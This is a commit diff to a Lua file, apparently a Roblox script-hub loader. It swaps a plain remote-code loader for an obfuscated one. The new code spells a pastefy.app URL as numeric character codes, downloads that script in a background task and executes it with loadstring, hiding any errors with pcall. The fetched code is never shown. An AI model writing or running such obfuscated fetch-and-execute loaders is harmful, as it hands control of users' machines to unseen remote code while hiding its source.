18a5cae8381c1000cba784331499b75c333d1f43
Op-Brainrot <pilotashiro@gmail.com>
2026-05-01 17:13:57 +0800

    Update zzzhub.lua

--- zzzhub.lua
+++ zzzhub.lua
@@ -1,1 +1,21 @@
-loadstring(game:HttpGet("https://pastefy.app/P6p4rQJe/raw"))()
+task.spawn(function()
+    local segments = {
+        {104,116,116,112,115,58,47,47},
+        {112,97,115,116,101,102,121,46,97,112,112,47},
+        {65,122,53,84,114,98,54,104,47},
+        {114,97,119}
+    }
+
+    local buffer = {}
+
+    for i = 1, #segments do
+        local seg = segments[i]
+        for j = 1, #seg do
+            buffer[#buffer + 1] = string.char(seg[j])
+        end
+    end
+
+    pcall(function()
+        loadstring(game:HttpGet(table.concat(buffer), true))()
+    end)
+end)
